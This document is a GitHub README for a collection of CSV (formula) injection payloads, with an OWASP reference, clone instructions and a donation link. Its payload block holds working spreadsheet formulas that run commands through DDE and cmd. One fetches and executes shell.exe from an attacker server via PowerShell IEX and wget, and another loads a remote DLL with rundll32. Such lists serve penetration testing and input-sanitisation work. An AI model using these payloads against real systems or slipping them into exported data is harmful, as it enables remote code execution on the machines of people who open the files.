## CSV Injection Payloads

<img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/csv-injection-payloads?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/csv-injection-payloads?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/csv-injection-payloads"> <img src="https://img.shields.io/github/license/payloadbox/csv-injection-payloads"> <img src="https://img.shields.io/github/issues/detail/author/payloadbox/csv-injection-payloads/1">

CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.

#### Payloads :

```
=DDE("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

#### References :

###### CSV Injection :

* 👉 https://owasp.org/www-community/attacks/CSV_Injection

##### Cloning an Existing Repository ( Clone with HTTPS )
```
root@ismailtasdelen:~# git clone https://github.com/payloadbox/csv-injection-payloads.git
```

##### Cloning an Existing Repository ( Clone with SSH )
```
root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git
```

#### Donate!

Support the authors:

#### LiberaPay:

<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
